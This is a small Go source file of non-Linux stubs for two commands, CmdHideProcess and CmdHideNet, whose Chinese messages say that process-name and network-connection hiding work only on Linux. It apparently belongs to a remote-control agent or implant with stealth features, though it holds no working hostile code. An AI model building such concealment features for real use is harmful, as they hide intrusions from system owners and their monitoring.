//go:build !linux

package commands

import "errors"

// CmdHideProcess 仅 Linux 支持
func CmdHideProcess(cmdBuf []byte) ([]byte, error) {
	return nil, errors.New("进程名隐藏仅支持 Linux")
}

// CmdHideNet 仅 Linux 支持
func CmdHideNet(cmdBuf []byte) ([]byte, error) {
	return nil, errors.New("网络连接隐藏仅支持 Linux")
}
